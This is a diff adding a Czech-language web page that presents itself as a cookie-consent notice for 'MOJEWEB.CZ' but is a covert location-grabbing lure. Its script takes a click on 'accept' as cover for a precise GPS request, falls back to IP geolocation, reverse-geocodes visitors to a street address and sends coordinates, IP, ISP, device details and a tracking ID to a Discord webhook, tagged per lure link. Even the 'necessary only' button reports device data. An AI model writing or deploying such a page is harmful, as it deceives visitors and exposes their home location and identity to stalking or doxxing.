@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Vítejte</title>
+<style>
+  *{box-sizing:border-box;margin:0}
+  body{min-height:100vh;background:#0b0e14;color:#e6e9ef;
+       font:16px/1.6 system-ui,sans-serif;padding-bottom:200px}
+  header{padding:18px 24px;border-bottom:1px solid #1c2430;font-weight:700;letter-spacing:.5px}
+  main{max-width:640px;margin:0 auto;padding:56px 24px}
+  h1{font-size:26px;margin-bottom:14px}
+  p{color:#93a1b5;margin-bottom:14px}
+  .box{margin-top:28px;padding:18px;border:1px solid #232b38;border-radius:12px;
+       background:#121821;font-size:14px;color:#7f8fa5}
+  footer{padding:24px;text-align:center;color:#4d5b6e;font-size:13px}
+  #ck{position:fixed;left:16px;right:16px;bottom:16px;max-width:620px;margin:0 auto;
+      background:#161d28;border:1px solid #2a3444;border-radius:14px;padding:20px;
+      box-shadow:0 12px 40px #0009;z-index:99}
+  #ck h2{font-size:16px;margin-bottom:8px}
+  #ck p{font-size:13.5px;margin-bottom:16px;color:#93a1b5}
+  #acc{width:100%;padding:13px;border:0;border-radius:10px;background:#4c8dff;color:#fff;
+       font-weight:700;font-size:15px;cursor:pointer}
+  #nec{display:block;margin:12px auto 0;background:none;border:0;color:#6c7b8f;
+       font-size:12.5px;cursor:pointer;text-decoration:underline}
+  .hide{display:none}
+</style>
+</head>
+<body>
+<header>MOJEWEB.CZ</header>
+<main>
+  <h1>Vítejte na našem webu</h1>
+  <p>Pro plnohodnotné zobrazení obsahu potřebujeme váš souhlas s ukládáním cookies.</p>
+  <p>Stačí jedno kliknutí, nic dalšího potvrzovat nemusíte.</p>
+  <div class="box">
+    <b>Co se ukládá:</b> technické cookies pro fungování stránky a preference zobrazení.
+    Souhlas můžete kdykoliv odvolat smazáním dat webu.
+  </div>
+</main>
+<footer>© 2026 Mojeweb.cz</footer>
+
+<div id="ck">
+  <h2>Používáme cookies</h2>
+  <p>Kliknutím na „Přijmout" souhlasíte s ukládáním cookies a zpracováním údajů o zařízení.</p>
+  <button id="acc">Přijmout</button>
+  <button id="nec">jen nutné</button>
+</div>
+
+<script>
+const HOOK = "https://discord.com/api/webhooks/ID/TOKEN";
+const label = new URLSearchParams(location.search).get("n") || "-";
+const POUZE_IP = false; // true = nikdy nevyvolávat dotaz na polohu
+
+const ck = {
+  get: n => (document.cookie.split("; ").find(c => c.startsWith(n + "=")) || "").split("=")[1],
+  set: (n, v, d) => document.cookie = `${n}=${v}; max-age=${d}; path=/; SameSite=Lax`
+};
+let sid = ck.get("sid");
+if (!sid) { sid = crypto.randomUUID().slice(0, 8); ck.set("sid", sid, 31536000); }
+
+/* --- odeslání na Discord --- */
+const post = payload => fetch(HOOK, {
+  method: "POST", keepalive: true,
+  headers: {"Content-Type": "application/json"},
+  body: JSON.stringify(payload)
+}).catch(() => {});
+
+const embed = (nadpis, barva, pole, url) => post({
+  username: "Web",
+  embeds: [{
+    title: nadpis, color: barva, url,
+    timestamp: new Date().toISOString(),
+    fields: pole,
+    footer: {text: `SID ${sid}`}
+  }]
+});
+
+const zaklad = () => [
+  {name: "Odkaz", value: label, inline: true},
+  {name: "UA", value: navigator.userAgent.slice(0, 200)},
+  {name: "Jazyk", value: navigator.language, inline: true},
+  {name: "Rozlišení", value: `${screen.width}x${screen.height}`, inline: true},
+  {name: "TZ", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true}
+];
+
+async function adresa(lat, lon) {
+  try {
+    const d = await (await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=cs`)).json();
+    return [d.street, d.streetNumber, d.postcode, d.locality].filter(Boolean).join(" ");
+  } catch { return ""; }
+}
+
+/* --- IP záloha, vždy s adresou --- */
+async function ipZaloha(duvod) {
+  let d = null;
+  try { d = await (await fetch("https://ipapi.co/json/")).json(); } catch {}
+  if (!d?.latitude) { embed("⚠️ Polohu nezjištěno", 0xffa726, [...zaklad(), {name: "Důvod", value: duvod}]); return; }
+
+  const a = await adresa(d.latitude, d.longitude);
+  embed("🌐 Poloha (IP)", 0xffa726, [
+    {name: "Město", value: `${d.city || "?"}, ${d.country_name || "?"}`, inline: true},
+    {name: "IP", value: `\`${d.ip}\``, inline: true},
+    {name: "ISP", value: d.org || "?", inline: true},
+    {name: "Adresa uzlu", value: a || "—"},
+    {name: "Souřadnice", value: `\`${d.latitude}, ${d.longitude}\``},
+    {name: "Poznámka", value: duvod, inline: true}
+  ], `https://www.google.com/maps?q=${d.latitude},${d.longitude}`);
+}
+
+/* --- GPS --- */
+function gps() {
+  navigator.geolocation.getCurrentPosition(async p => {
+    const {latitude: lat, longitude: lon, accuracy: acc} = p.coords;
+    const a = await adresa(lat, lon);
+    const pole = [
+      {name: "Přesnost", value: `±${Math.round(acc)} m`, inline: true},
+      {name: "Souřadnice", value: `\`${lat}, ${lon}\``},
+      {name: "Adresa", value: a || "—"},
+      ...zaklad()
+    ];
+    embed("📍 Přesná poloha", 0x4cd964, pole, `https://www.google.com/maps?q=${lat},${lon}`);
+  }, e => ipZaloha(e.message), {enableHighAccuracy: true, timeout: 20000, maximumAge: 0});
+}
+
+/* --- klik --- */
+document.getElementById("acc").onclick = () => {
+  ck.set("consent", "1", 31536000);
+  document.getElementById("ck").classList.add("hide");
+  if (POUZE_IP) ipZaloha("režim pouze IP");
+  else gps();                 // synchronně, dokud platí gesto
+};
+
+document.getElementById("nec").onclick = () => {
+  ck.set("consent", "0", 31536000);
+  document.getElementById("ck").classList.add("hide");
+  embed("🍪 Jen nutné", 0x8899ad, zaklad());
+};
+
+/* vracející se návštěvník */
+(async () => {
+  if (ck.get("consent") !== "1") return;
+  document.getElementById("ck").classList.add("hide");
+  try {
+    const st = (await navigator.permissions.query({name: "geolocation"})).state;
+    if (st === "granted" && !POUZE_IP) setTimeout(gps, 500);
+  } catch {}
+})();
+</script>
+</body>
+</html>
